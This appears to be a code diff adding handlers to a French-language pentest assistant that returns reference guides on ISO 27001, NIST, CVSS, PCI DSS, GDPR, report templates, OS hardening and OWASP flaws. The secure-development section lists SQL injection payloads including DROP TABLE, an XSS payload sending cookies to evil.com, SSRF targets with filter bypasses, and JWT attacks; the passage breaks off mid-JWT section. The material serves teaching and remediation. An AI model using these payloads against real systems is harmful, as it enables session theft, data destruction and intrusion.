+    def _handle_governance(self, task: str) -> dict:
+        t = task.lower()
+
+        if any(kw in t for kw in ["iso 27001", "iso27001", "27001"]):
+            return self._result(True,
+                "📋  ISO 27001 — Système de Management de la Sécurité (SMSI)\n\n"
+                "STRUCTURE DE LA NORME :\n"
+                "  Annexe A — 93 contrôles en 4 thèmes :\n"
+                "    A.5  Organisationnels (37 contrôles)\n"
+                "    A.6  Humains (8 contrôles)\n"
+                "    A.7  Physiques (14 contrôles)\n"
+                "    A.8  Technologiques (34 contrôles)\n\n"
+                "ÉTAPES DE CERTIFICATION :\n"
+                "  1. Définir le périmètre (scope)\n"
+                "  2. Évaluation des risques (ISO 27005)\n"
+                "  3. Déclaration d'applicabilité (SoA)\n"
+                "  4. Plan de traitement des risques\n"
+                "  5. Mise en œuvre des contrôles\n"
+                "  6. Audit interne\n"
+                "  7. Revue de direction\n"
+                "  8. Audit de certification (stage 1 + stage 2)\n\n"
+                "CONTRÔLES CRITIQUES :\n"
+                "  A.8.8  — Gestion des vulnérabilités\n"
+                "  A.8.20 — Sécurité réseau\n"
+                "  A.8.24 — Utilisation de la cryptographie\n"
+                "  A.5.7  — Threat Intelligence\n"
+                "  A.5.24 — Gestion des incidents",
+                {"domain": "governance", "standard": "iso27001"})
+
+        if any(kw in t for kw in ["nist", "nist csf", "cybersecurity framework"]):
+            return self._result(True,
+                "📋  NIST Cybersecurity Framework (CSF 2.0)\n\n"
+                "6 FONCTIONS CORE :\n"
+                "  GOVERN (GV)  → Gouvernance, politique, rôles\n"
+                "  IDENTIFY (ID)→ Actifs, risques, lacunes\n"
+                "  PROTECT (PR) → Contrôles d'accès, formation, maintenance\n"
+                "  DETECT (DE)  → Monitoring, détection d'anomalies\n"
+                "  RESPOND (RS) → Réponse aux incidents, communication\n"
+                "  RECOVER (RC) → Reprise, améliorations post-incident\n\n"
+                "TIERS DE MATURITÉ :\n"
+                "  Tier 1 — Partiel (ad hoc)\n"
+                "  Tier 2 — Informé (risque conscient)\n"
+                "  Tier 3 — Répétable (processus formels)\n"
+                "  Tier 4 — Adaptatif (amélioration continue)\n\n"
+                "AUTRES FRAMEWORKS NIST :\n"
+                "  NIST SP 800-53  → Contrôles fédéraux US\n"
+                "  NIST SP 800-115 → Guide pentest technique\n"
+                "  NIST SP 800-61  → Réponse aux incidents\n"
+                "  NIST SP 800-171 → Protection CUI",
+                {"domain": "governance", "standard": "nist"})
+
+        if any(kw in t for kw in ["cvss", "score", "scoring", "cvss score"]):
+            return self._result(True,
+                "📊  CVSS v3.1 — Common Vulnerability Scoring System\n\n"
+                "VECTEURS DE BASE :\n"
+                "  AV (Attack Vector)   : N(réseau) / A(adjacent) / L(local) / P(physique)\n"
+                "  AC (Attack Complexity): L(faible) / H(élevée)\n"
+                "  PR (Privileges Req.) : N(aucun) / L(faible) / H(élevé)\n"
+                "  UI (User Interaction): N(aucun) / R(requis)\n"
+                "  S  (Scope)           : U(inchangé) / C(changé)\n"
+                "  C  (Confidentiality) : N / L / H\n"
+                "  I  (Integrity)       : N / L / H\n"
+                "  A  (Availability)    : N / L / H\n\n"
+                "NIVEAUX DE SÉVÉRITÉ :\n"
+                "  0.0       → None\n"
+                "  0.1–3.9   → Low\n"
+                "  4.0–6.9   → Medium\n"
+                "  7.0–8.9   → High\n"
+                "  9.0–10.0  → Critical\n\n"
+                "CALCULER UN SCORE :\n"
+                "  nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n"
+                "  python3: cvss (pip install cvss)\n"
+                "    from cvss import CVSS3\n"
+                "    c = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')\n"
+                "    print(c.scores())  → (10.0, ...)\n\n"
+                "EXEMPLE VECTEUR CRITIQUE :\n"
+                "  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)",
+                {"domain": "governance", "tool": "cvss"})
+
+        if any(kw in t for kw in ["pci dss", "pcidss", "pci-dss"]):
+            return self._result(True,
+                "📋  PCI DSS v4.0 — Payment Card Industry\n\n"
+                "12 EXIGENCES PRINCIPALES :\n"
+                "  1. Pare-feu réseau configuré\n"
+                "  2. Pas de mots de passe par défaut\n"
+                "  3. Protéger les données de titulaires de carte\n"
+                "  4. Chiffrement en transit (TLS 1.2+)\n"
+                "  5. Antimalware sur tous les systèmes\n"
+                "  6. Sécuriser les systèmes et applications (patching, WAF)\n"
+                "  7. Contrôle d'accès need-to-know\n"
+                "  8. Identification unique par utilisateur + MFA\n"
+                "  9. Sécurité physique\n"
+                " 10. Journalisation et surveillance\n"
+                " 11. Tests de sécurité réguliers (pentest annuel, ASV)\n"
+                " 12. Politique de sécurité documentée\n\n"
+                "SCOPES D'ÉVALUATION :\n"
+                "  SAQ A      → Marchand redirigé (e-commerce simple)\n"
+                "  SAQ D      → Tous les contrôles requis\n"
+                "  QSA        → Qualified Security Assessor (sur site)\n\n"
+                "POINTS CRITIQUES PENTEST PCI :\n"
+                "  Segmentation réseau CDE isolé\n"
+                "  Rotation des clés de chiffrement\n"
+                "  WAF devant les applis",
+                {"domain": "governance", "standard": "pci_dss"})
+
+        if any(kw in t for kw in ["rgpd", "gdpr"]):
+            return self._result(True,
+                "📋  RGPD / GDPR — Protection des données personnelles\n\n"
+                "PRINCIPES FONDAMENTAUX :\n"
+                "  Licéité, loyauté, transparence\n"
+                "  Limitation des finalités\n"
+                "  Minimisation des données\n"
+                "  Exactitude\n"
+                "  Limitation de la conservation\n"
+                "  Intégrité et confidentialité\n\n"
+                "OBLIGATIONS TECHNIQUES (Article 25 & 32) :\n"
+                "  Pseudonymisation / chiffrement des données\n"
+                "  Confidentialité, intégrité, disponibilité\n"
+                "  Résilience des systèmes\n"
+                "  Tests de sécurité réguliers\n"
+                "  Notification violation sous 72h (Article 33)\n\n"
+                "IMPACT PENTEST :\n"
+                "  Vérifier : chiffrement BDD, logs d'accès, gestion droits\n"
+                "  Tester : injection SQL sur données perso, IDOR sur profils\n"
+                "  Rapport : noter les données exposées + sévérité RGPD\n\n"
+                "SANCTIONS : jusqu'à 4% CA mondial ou 20M€",
+                {"domain": "governance", "standard": "rgpd"})
+
+        if any(kw in t for kw in ["cis benchmark", "cis controls"]):
+            return self._result(True,
+                "📋  CIS Controls v8 — 18 contrôles essentiels\n\n"
+                "IMPLEMENTATION GROUP 1 (bases) :\n"
+                "  1. Inventaire des actifs matériels\n"
+                "  2. Inventaire des logiciels\n"
+                "  3. Protection des données\n"
+                "  4. Configuration sécurisée\n"
+                "  5. Gestion des comptes\n"
+                "  6. Gestion des accès\n\n"
+                "CONTRÔLES AVANCÉS :\n"
+                "  7.  Gestion des vulnérabilités\n"
+                "  8.  Gestion des logs d'audit\n"
+                "  9.  Protection email/navigateur\n"
+                " 10.  Défense contre malware\n"
+                " 11.  Récupération des données\n"
+                " 13.  Sécurité réseau\n"
+                " 16.  Sécurité applicative\n"
+                " 17.  Gestion des incidents\n"
+                " 18.  Tests de pénétration\n\n"
+                "BENCHMARKS SYSTÈME :\n"
+                "  cis-cat-lite      → scanner automatique\n"
+                "  ansible/openscap  → durcissement automatisé\n"
+                "  inspec (chef)     → compliance as code",
+                {"domain": "governance", "standard": "cis"})
+
+        return self._result(True,
+            "📋  Gouvernance & Conformité — Référentiels supportés\n\n"
+            "  iso 27001     → SMSI, certifification, contrôles Annexe A\n"
+            "  nist          → CSF 2.0, SP 800-53, SP 800-115\n"
+            "  cvss          → calcul et interprétation scores\n"
+            "  pci dss       → sécurité paiement carte\n"
+            "  rgpd / gdpr   → protection données personnelles\n"
+            "  cis benchmark → durcissement systèmes\n\n"
+            "Précise le référentiel pour un guide détaillé.",
+            {"domain": "governance"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 15 — RÉDACTION RAPPORT PENTEST
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_report(self, task: str) -> dict:
+        t = task.lower()
+
+        if any(kw in t for kw in ["executive summary", "résumé exécutif"]):
+            return self._result(True,
+                "📝  Executive Summary — Template pentest\n\n"
+                "STRUCTURE :\n"
+                "┌─────────────────────────────────────────────┐\n"
+                "│  RÉSUMÉ EXÉCUTIF                             │\n"
+                "│                                              │\n"
+                "│  Contexte :                                  │\n"
+                "│    Périmètre testé, dates, équipe            │\n"
+                "│                                              │\n"
+                "│  Résultat global :                           │\n"
+                "│    Niveau de risque : CRITIQUE / ÉLEVÉ / ... │\n"
+                "│    X critiques, Y élevées, Z moyennes        │\n"
+                "│                                              │\n"
+                "│  Points forts :                              │\n"
+                "│    [Ce qui fonctionne bien]                  │\n"
+                "│                                              │\n"
+                "│  Points faibles majeurs :                    │\n"
+                "│    [Top 3 vulnérabilités + impact business]  │\n"
+                "│                                              │\n"
+                "│  Recommandations prioritaires :              │\n"
+                "│    1. Immédiat (< 7j) — Patcher CVE-XXXX    │\n"
+                "│    2. Court terme (< 30j) — MFA sur VPN     │\n"
+                "│    3. Moyen terme (< 90j) — Segmentation     │\n"
+                "└─────────────────────────────────────────────┘\n\n"
+                "RÈGLES D'OR :\n"
+                "  • Pas de jargon technique\n"
+                "  • Impact business en premier\n"
+                "  • 1 page maximum\n"
+                "  • Lié au risque métier, pas technique",
+                {"domain": "report", "section": "executive_summary"})
+
+        if any(kw in t for kw in ["findings", "vulnérabilité", "fiche vulnérabilité"]):
+            return self._result(True,
+                "📝  Template Fiche Vulnérabilité\n\n"
+                "┌─────────────────────────────────────────────┐\n"
+                "│  VULNÉRABILITÉ #001                          │\n"
+                "├─────────────────────────────────────────────┤\n"
+                "│  Titre       : SQL Injection — Login         │\n"
+                "│  Sévérité    : CRITIQUE (CVSS 9.8)           │\n"
+                "│  Composant   : https://app.cible.fr/login    │\n"
+                "│  CWE         : CWE-89 (SQL Injection)        │\n"
+                "│  CVE         : N/A (custom)                  │\n"
+                "├─────────────────────────────────────────────┤\n"
+                "│  DESCRIPTION                                 │\n"
+                "│    Le paramètre 'username' est vulnérable    │\n"
+                "│    à une injection SQL booléenne.            │\n"
+                "├─────────────────────────────────────────────┤\n"
+                "│  PREUVE (Proof of Concept)                   │\n"
+                "│    Requête : POST /login                     │\n"
+                "│    Payload : username=admin'--               │\n"
+                "│    Résultat : authentification contournée    │\n"
+                "│    [CAPTURE D'ÉCRAN]                         │\n"
+                "├─────────────────────────────────────────────┤\n"
+                "│  IMPACT                                      │\n"
+                "│    Confidentialité : HAUTE (dump BDD)        │\n"
+                "│    Intégrité       : HAUTE (modification)    │\n"
+                "│    Disponibilité   : MOYENNE                 │\n"
+                "├─────────────────────────────────────────────┤\n"
+                "│  REMÉDIATION                                 │\n"
+                "│    Court terme : Requêtes préparées (PDO)    │\n"
+                "│    Moyen terme : WAF, input validation       │\n"
+                "│    Références  : OWASP Top 10 A03:2021       │\n"
+                "└─────────────────────────────────────────────┘",
+                {"domain": "report", "section": "finding"})
+
+        if any(kw in t for kw in ["template rapport", "structure rapport", "plan rapport"]):
+            return self._result(True,
+                "📝  Structure complète Rapport de Pentest\n\n"
+                "1. PAGE DE GARDE\n"
+                "   Client, date, version, classification (CONFIDENTIEL)\n\n"
+                "2. SOMMAIRE\n\n"
+                "3. RÉSUMÉ EXÉCUTIF (pour le management)\n"
+                "   Contexte, risque global, top 3 findings, quick wins\n\n"
+                "4. PÉRIMÈTRE ET MÉTHODOLOGIE\n"
+                "   Scope, durée, équipe, outils, règles d'engagement\n"
+                "   Référentiel : PTES / OWASP / NIST SP 800-115\n\n"
+                "5. RÉSULTATS — TABLEAU DE SYNTHÈSE\n"
+                "   ID | Titre | Sévérité | Composant | CVSS | Statut\n\n"
+                "6. DÉTAIL DES VULNÉRABILITÉS\n"
+                "   Pour chaque finding : description, PoC, impact, remédiation\n\n"
+                "7. RECOMMANDATIONS PAR PRIORITÉ\n"
+                "   Immédiat / Court terme / Moyen terme / Long terme\n\n"
+                "8. ANNEXES\n"
+                "   Logs bruts, captures d'écran, scripts utilisés\n\n"
+                "CLASSIFICATION DES SÉVÉRITÉS :\n"
+                "  🔴 Critique (CVSS 9.0+) — Impact immédiat sur le SI\n"
+                "  🟠 Élevée   (CVSS 7.0+) — Compromission probable\n"
+                "  🟡 Moyenne  (CVSS 4.0+) — Risque conditionnel\n"
+                "  🔵 Faible   (CVSS <4.0) — Risque limité\n"
+                "  ⚪ Info     (CVSS 0.0)  — Observation",
+                {"domain": "report", "section": "full_structure"})
+
+        if any(kw in t for kw in ["remédiation", "recommandation", "plan de remédiation"]):
+            return self._result(True,
+                "📝  Plan de remédiation — Template\n\n"
+                "PRIORISATION PAR RISQUE :\n"
+                "┌──────────────┬──────────────────┬──────────┐\n"
+                "│ Priorité     │ Délai            │ CVSS     │\n"
+                "├──────────────┼──────────────────┼──────────┤\n"
+                "│ P0 Immédiat  │ < 48h            │ 9.0–10.0 │\n"
+                "│ P1 Urgent    │ < 7 jours        │ 7.0–8.9  │\n"
+                "│ P2 Élevé     │ < 30 jours       │ 4.0–6.9  │\n"
+                "│ P3 Moyen     │ < 90 jours       │ 0.1–3.9  │\n"
+                "└──────────────┴──────────────────┴──────────┘\n\n"
+                "STRUCTURE RECOMMANDATION :\n"
+                "  Problème    : [Description technique concise]\n"
+                "  Solution    : [Action concrète à effectuer]\n"
+                "  Vérification: [Comment tester la correction]\n"
+                "  Effort      : Faible / Moyen / Élevé\n"
+                "  Référence   : OWASP / CWE / CVE / CIS\n\n"
+                "QUICK WINS COMMUNS :\n"
+                "  • Activer MFA partout (< 1 jour)\n"
+                "  • Patcher OS et services exposés (< 3 jours)\n"
+                "  • Désactiver protocoles obsolètes (TLS 1.0/1.1, SSLv3)\n"
+                "  • Activer en-têtes sécurité HTTP (CSP, HSTS, X-Frame)\n"
+                "  • Rotation des secrets et clés API exposés",
+                {"domain": "report", "section": "remediation"})
+
+        return self._result(True,
+            "📝  Rédaction Rapport Pentest — Guide complet\n\n"
+            "  executive summary  → résumé pour le management\n"
+            "  findings           → template fiche vulnérabilité\n"
+            "  template rapport   → structure complète du rapport\n"
+            "  remédiation        → plan de remédiation par priorité\n\n"
+            "CONSEILS :\n"
+            "  • Audience : distinguer management vs technique\n"
+            "  • PoC : toujours inclure une preuve reproducible\n"
+            "  • CVSS : scorer chaque vulnérabilité avec vecteur complet\n"
+            "  • Remédiation : concrète, testable, priorisée\n"
+            "  • Classification : CONFIDENTIEL — données sensibles",
+            {"domain": "report"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 1 — ADMINISTRATION OS (Linux / Windows / macOS)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_os_admin(self, task: str) -> dict:
+        t = task.lower()
+
+        # ── Linux ─────────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["linux", "ubuntu", "debian", "centos", "rhel", "kali"]):
+
+            if any(kw in t for kw in ["hardening", "durcissement"]):
+                return self._result(True,
+                    "🐧  Linux Hardening — Checklist CIS\n\n"
+                    "COMPTES ET ACCÈS :\n"
+                    "  passwd -l root                          → désactiver login root\n"
+                    "  usermod -s /usr/sbin/nologin <user>     → désactiver shell\n"
+                    "  chage -M 90 <user>                      → expiration mdp 90j\n"
+                    "  grep '^+' /etc/passwd /etc/shadow       → comptes NIS dangereux\n\n"
+                    "SSH :\n"
+                    "  /etc/ssh/sshd_config :\n"
+                    "    PermitRootLogin no\n"
+                    "    PasswordAuthentication no\n"
+                    "    Protocol 2\n"
+                    "    MaxAuthTries 3\n"
+                    "    AllowUsers user1 user2\n\n"
+                    "SERVICES :\n"
+                    "  systemctl --type=service --state=running  → services actifs\n"
+                    "  systemctl disable <service>               → désactiver inutile\n"
+                    "  ss -tlnp                                  → ports ouverts\n\n"
+                    "PERMISSIONS :\n"
+                    "  find / -perm -4000 -type f 2>/dev/null   → SUID dangereux\n"
+                    "  find / -perm -2000 -type f 2>/dev/null   → SGID\n"
+                    "  find / -nouser -nogroup 2>/dev/null      → fichiers orphelins\n\n"
+                    "FIREWALL :\n"
+                    "  ufw enable && ufw default deny\n"
+                    "  ufw allow ssh\n"
+                    "  iptables -L -n -v\n\n"
+                    "AUDIT :\n"
+                    "  auditd, aide, lynis, OpenSCAP",
+                    {"domain": "os_admin", "os": "linux"})
+
+            if any(kw in t for kw in ["logs", "journalisation", "syslog", "journald"]):
+                return self._result(True,
+                    "🐧  Linux — Journalisation et logs\n\n"
+                    "JOURNAUX IMPORTANTS :\n"
+                    "  /var/log/auth.log        → authentifications (Debian)\n"
+                    "  /var/log/secure          → authentifications (RHEL)\n"
+                    "  /var/log/syslog          → messages système\n"
+                    "  /var/log/kern.log        → messages kernel\n"
+                    "  /var/log/apache2/        → logs Apache\n"
+                    "  /var/log/nginx/          → logs Nginx\n"
+                    "  journalctl -u ssh        → logs service SSH\n\n"
+                    "COMMANDES UTILES :\n"
+                    "  journalctl -f                → flux temps réel\n"
+                    "  journalctl --since '1h ago'  → 1 dernière heure\n"
+                    "  journalctl -p err            → erreurs seulement\n"
+                    "  last                         → historique logins\n"
+                    "  lastb                        → tentatives échouées\n"
+                    "  who / w                      → sessions actives\n"
+                    "  ausearch -m USER_LOGIN        → audit logins\n\n"
+                    "RECHERCHER COMPROMISSION :\n"
+                    "  grep 'Failed password' /var/log/auth.log | head -20\n"
+                    "  grep 'Accepted password' /var/log/auth.log\n"
+                    "  find /tmp /dev/shm -name '*.sh' -o -name '*.py' 2>/dev/null\n"
+                    "  ps auxf | grep -v ']'   → processus suspects",
+                    {"domain": "os_admin", "skill": "logging"})
+
+            if any(kw in t for kw in ["processus", "gestion processus", "ps", "service"]):
+                return self._result(True,
+                    "🐧  Linux — Gestion des processus et services\n\n"
+                    "PROCESSUS :\n"
+                    "  ps aux                    → tous les processus\n"
+                    "  ps auxf                   → arbre de processus\n"
+                    "  top / htop                → monitoring temps réel\n"
+                    "  kill -9 <PID>             → tuer un processus\n"
+                    "  nice -n 10 cmd            → priorité basse\n"
+                    "  strace -p <PID>           → syscalls d'un process\n\n"
+                    "SERVICES SYSTEMD :\n"
+                    "  systemctl status <svc>   → état du service\n"
+                    "  systemctl start/stop/restart <svc>\n"
+                    "  systemctl enable/disable <svc>  → démarrage auto\n"
+                    "  systemctl list-units --type=service\n"
+                    "  journalctl -u <svc> -f   → logs temps réel\n\n"
+                    "CRON :\n"
+                    "  crontab -l              → tâches utilisateur\n"
+                    "  cat /etc/crontab        → tâches système\n"
+                    "  ls /etc/cron.d/         → crons installés\n"
+                    "  ls -la /etc/cron.{daily,weekly,monthly}/\n\n"
+                    "SÉCURITÉ :\n"
+                    "  pspy64                  → monitor processus sans root",
+                    {"domain": "os_admin", "skill": "processes"})
+
+            return self._result(True,
+                "🐧  Linux — Administration et sécurité\n\n"
+                "  linux hardening   → durcissement CIS checklist\n"
+                "  linux logs        → journalisation et recherche compromission\n"
+                "  linux processus   → gestion ps/systemd/cron\n"
+                "  linux permissions → SUID/SGID/ACL/selinux\n"
+                "  linux audit       → auditd, lynis, aide\n\n"
+                "Précise le domaine pour un guide détaillé.",
+                {"domain": "os_admin", "os": "linux"})
+
+        # ── Windows ───────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["windows", "win", "powershell", "cmd", "gpo", "registry", "registre",
+                                   "bitlocker", "defender", "event viewer", "wmic"]):
+            if any(kw in t for kw in ["hardening", "durcissement"]):
+                return self._result(True,
+                    "🪟  Windows Hardening — Checklist CIS\n\n"
+                    "COMPTES :\n"
+                    "  Renommer Administrator → autre nom\n"
+                    "  Désactiver Guest account\n"
+                    "  Politique MDP : 12+ chars, complexité, 90j\n"
+                    "  Account lockout : 5 tentatives → 30min\n\n"
+                    "SERVICES :\n"
+                    "  Get-Service | Where Status -eq Running      (PowerShell)\n"
+                    "  Désactiver : Telnet, SMBv1, LLMNR, NetBIOS\n"
+                    "  Set-SmbServerConfiguration -EnableSMB1Protocol $false\n\n"
+                    "FIREWALL :\n"
+                    "  netsh advfirewall set allprofiles state on\n"
+                    "  Set-NetFirewallProfile -Profile * -Enabled True\n\n"
+                    "UPDATES :\n"
+                    "  wuauclt /detectnow         → forcer vérification\n"
+                    "  Get-WindowsUpdateLog       → logs mises à jour\n\n"
+                    "AUDIT AVANCÉ :\n"
+                    "  auditpol /set /category:*  → activer audit\n"
+                    "  Microsoft Baseline Security Analyzer (MBSA)\n"
+                    "  CIS-CAT Pro",
+                    {"domain": "os_admin", "os": "windows"})
+
+            if any(kw in t for kw in ["logs", "event viewer", "event log"]):
+                return self._result(True,
+                    "🪟  Windows — Journaux d'événements\n\n"
+                    "JOURNAUX PRINCIPAUX :\n"
+                    "  Security    → logins, audit, accès\n"
+                    "  System      → OS, drivers, services\n"
+                    "  Application → apps, erreurs\n\n"
+                    "EVENT IDs CRITIQUES :\n"
+                    "  4624 → Connexion réussie\n"
+                    "  4625 → Connexion échouée\n"
+                    "  4648 → Connexion explicite (runas)\n"
+                    "  4672 → Droits admin attribués\n"
+                    "  4698 → Tâche planifiée créée\n"
+                    "  4720 → Compte créé\n"
+                    "  7045 → Service installé\n"
+                    "  1102 → Journal effacé (!!)\n\n"
+                    "POWERSHELL :\n"
+                    "  Get-WinEvent -LogName Security -MaxEvents 100\n"
+                    "  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Select -First 20\n\n"
+                    "OUTIL : Chainsaw, Hayabusa, Sigma rules",
+                    {"domain": "os_admin", "os": "windows"})
+
+            return self._result(True,
+                "🪟  Windows — Administration et sécurité\n\n"
+                "  windows hardening  → durcissement CIS\n"
+                "  windows logs       → Event IDs critiques\n"
+                "  gpo                → Group Policy sécurité\n"
+                "  powershell audit   → scripts d'audit\n\n"
+                "COMMANDES UTILES :\n"
+                "  net user                    → utilisateurs locaux\n"
+                "  net localgroup Administrators\n"
+                "  whoami /priv                → privilèges courants\n"
+                "  systeminfo                  → infos système\n"
+                "  netstat -an                 → connexions réseau\n"
+                "  tasklist /svc               → processus + services\n"
+                "  schtasks /query /fo LIST    → tâches planifiées",
+                {"domain": "os_admin", "os": "windows"})
+
+        # ── macOS ─────────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["macos", "mac os", "osx", "gatekeeper", "xprotect"]):
+            return self._result(True,
+                "🍎  macOS — Sécurité et administration\n\n"
+                "SÉCURITÉ NATIVE :\n"
+                "  Gatekeeper    → vérifie signature des apps\n"
+                "  XProtect      → antimalware intégré\n"
+                "  TCC           → permissions (cam, micro, disque)\n"
+                "  SIP           → System Integrity Protection\n"
+                "  FileVault     → chiffrement disque (AES-256)\n"
+                "  Secure Enclave→ clés biométriques\n\n"
+                "COMMANDES ADMIN :\n"
+                "  softwareupdate --list              → mises à jour\n"
+                "  spctl --status                     → état Gatekeeper\n"
+                "  csrutil status                     → état SIP\n"
+                "  system_profiler SPSoftwareDataType → infos système\n"
+                "  log stream --predicate 'process == \"sshd\"'\n"
+                "  launchctl list | grep -v apple     → LaunchAgents suspects\n\n"
+                "FORENSICS macOS :\n"
+                "  /Library/Logs/DiagnosticReports/   → crashlogs\n"
+                "  ~/Library/Preferences/             → préférences apps\n"
+                "  /var/log/                          → logs système\n"
+                "  ls -la ~/Library/LaunchAgents/     → persistance\n\n"
+                "OUTILS PENTEST macOS :\n"
+                "  LockSmith, ESET, Objective-See (RansomWhere, BlockBlock, KnockKnock)",
+                {"domain": "os_admin", "os": "macos"})
+
+        # Guide général OS
+        return self._result(True,
+            "💻  Administration OS — Domaines couverts\n\n"
+            "  linux [hardening|logs|processus]   → Linux\n"
+            "  windows [hardening|logs|gpo]       → Windows\n"
+            "  macos                              → macOS\n\n"
+            "POINTS COMMUNS TOUS OS :\n"
+            "  Principe du moindre privilège\n"
+            "  Désactiver les services inutiles\n"
+            "  Journalisation centralisée (SIEM)\n"
+            "  Patch management régulier\n"
+            "  MFA sur tous les accès admin\n"
+            "  Backup isolé et testé (3-2-1)",
+            {"domain": "os_admin"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 9 — DÉVELOPPEMENT SÉCURISÉ (OWASP, SAST, API)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_dev_secure(self, task: str) -> dict:
+        t = task.lower()
+
+        if any(kw in t for kw in ["owasp top 10", "owasp"]):
+            return self._result(True,
+                "🛡️  OWASP Top 10 — 2021\n\n"
+                "A01 Broken Access Control\n"
+                "  Bypass d'autorisation, IDOR, CSRF\n"
+                "  Fix : vérification côté serveur, deny-by-default\n\n"
+                "A02 Cryptographic Failures\n"
+                "  Données sensibles en clair, MD5/SHA1, HTTP\n"
+                "  Fix : TLS 1.2+, AES-256, bcrypt\n\n"
+                "A03 Injection\n"
+                "  SQL, LDAP, OS, NoSQL, XPath injection\n"
+                "  Fix : requêtes préparées, ORM, validation input\n\n"
+                "A04 Insecure Design\n"
+                "  Absence de contrôles de sécurité dès la conception\n"
+                "  Fix : Threat Modeling, Secure SDLC\n\n"
+                "A05 Security Misconfiguration\n"
+                "  Config par défaut, debug activé, S3 public\n"
+                "  Fix : hardening, désactiver features inutiles\n\n"
+                "A06 Vulnerable Components\n"
+                "  Librairies obsolètes, CVE non patchées\n"
+                "  Fix : SCA (Snyk, OWASP Dependency-Check)\n\n"
+                "A07 Auth Failures\n"
+                "  Session fixation, credential stuffing\n"
+                "  Fix : MFA, rate limiting, session management\n\n"
+                "A08 Software Integrity Failures\n"
+                "  Supply chain, CI/CD non sécurisé\n"
+                "  Fix : signatures code, SBOM, trusted sources\n\n"
+                "A09 Logging Failures\n"
+                "  Absence de logs, pas d'alertes\n"
+                "  Fix : SIEM, alertes temps réel\n\n"
+                "A10 SSRF\n"
+                "  Requête serveur vers ressource interne\n"
+                "  Fix : allowlist URLs, désactiver redirections",
+                {"domain": "dev_secure", "standard": "owasp_top10"})
+
+        if any(kw in t for kw in ["injection sql", "sqli", "sql injection"]):
+            return self._result(True,
+                "🛡️  Injection SQL — Détection et remédiation\n\n"
+                "TYPES :\n"
+                "  In-band    : résultat direct dans la réponse\n"
+                "  Blind bool : vrai/faux selon la réponse\n"
+                "  Blind time : SLEEP()/WAITFOR DELAY pour inférer\n"
+                "  Out-of-band: via DNS/HTTP vers serveur attaquant\n\n"
+                "PAYLOADS BASIQUES :\n"
+                "  ' OR 1=1 --\n"
+                "  ' UNION SELECT NULL,NULL,NULL --\n"
+                "  ' AND SLEEP(5) --  (blind time)\n"
+                "  '; DROP TABLE users --  (stacked)\n\n"
+                "DÉTECTION :\n"
+                "  sqlmap -u 'http://site/?id=1' --dbs\n"
+                "  sqlmap -u 'http://site/' --data='user=a&pass=b' --level=5\n\n"
+                "REMÉDIATION :\n"
+                "  PHP  : PDO avec prepare/execute\n"
+                "  Python: SQLAlchemy ORM ou parameterized queries\n"
+                "  Java : PreparedStatement\n"
+                "  Code : $stmt = $pdo->prepare('SELECT * FROM u WHERE id = ?');\n"
+                "         $stmt->execute([$id]);\n\n"
+                "VALIDATION :\n"
+                "  Whitelist d'entrée, cast de types, WAF",
+                {"domain": "dev_secure", "vuln": "sqli"})
+
+        if any(kw in t for kw in ["xss", "cross-site scripting"]):
+            return self._result(True,
+                "🛡️  XSS — Cross-Site Scripting\n\n"
+                "TYPES :\n"
+                "  Reflected  : payload dans l'URL, 1 victime\n"
+                "  Stored     : payload en BDD, toutes les victimes\n"
+                "  DOM-based  : manipulation du DOM côté client\n\n"
+                "PAYLOADS BASIQUES :\n"
+                "  <script>alert(1)</script>\n"
+                "  <img src=x onerror=alert(1)>\n"
+                "  javascript:alert(document.cookie)\n"
+                "  <svg onload=fetch('https://evil.com/?c='+document.cookie)>\n\n"
+                "EXPLOITATION :\n"
+                "  BeEF (Browser Exploitation Framework) → hook navigateur\n"
+                "  Vol de cookie (HttpOnly absent)\n"
+                "  Keylogging, capture formulaires\n"
+                "  Redirection vers phishing\n\n"
+                "REMÉDIATION :\n"
+                "  Encoder les sorties : htmlspecialchars() / DOMPurify\n"
+                "  CSP : Content-Security-Policy: default-src 'self'\n"
+                "  Cookies : HttpOnly; Secure; SameSite=Strict\n"
+                "  Validation et sanitisation de toutes les entrées",
+                {"domain": "dev_secure", "vuln": "xss"})
+
+        if any(kw in t for kw in ["ssrf", "server-side request"]):
+            return self._result(True,
+                "🛡️  SSRF — Server-Side Request Forgery\n\n"
+                "CIBLES CLASSIQUES :\n"
+                "  http://127.0.0.1/admin          → services internes\n"
+                "  http://169.254.169.254/          → AWS metadata\n"
+                "  http://localhost:6379/           → Redis non authentifié\n"
+                "  file:///etc/passwd              → lecture fichiers\n"
+                "  dict://localhost:11211/         → Memcached\n\n"
+                "DÉTECTION :\n"
+                "  Burp Suite Collaborator → callbacks DNS/HTTP\n"
+                "  Interactsh (open source) → détection OOB\n"
+                "  Paramètres : url=, path=, dest=, redirect=, uri=\n\n"
+                "BYPASS FILTRES :\n"
+                "  http://0x7f000001/              → 127.0.0.1 en hex\n"
+                "  http://[::1]/                  → IPv6 loopback\n"
+                "  http://127.1/                  → octets manquants\n"
+                "  Redirection 302 → contournement de whitelist\n\n"
+                "REMÉDIATION :\n"
+                "  Allowlist stricte d'URLs/IPs\n"
+                "  Désactiver les redirections HTTP\n"
+                "  Isoler le service dans un réseau dédié\n"
+                "  IMDSv2 sur AWS (token requis)",
+                {"domain": "dev_secure", "vuln": "ssrf"})
+
+        if any(kw in t for kw in ["jwt", "json web token"]):
+            return self._result(True,
+                "🛡️  JWT — Attaques et sécurisation\n\n"
+                "STRUCTURE :\n"
+                "  Header.Payload.Signature (base64url encodés)\n\n"
+                "ATTAQUES CLASSIQUES :\n"
+                "  1. alg:none — supprimer la signature\n"
+                "     {'alg': 'none'} → pas de vérification\n\n"
+                "  2. RS256 → HS256 — confusion algorithme\n"
+                "     Signer avec la clé publique RSA comme HMAC\n\n"
+                "  3. Brute-force secret HS256\n"
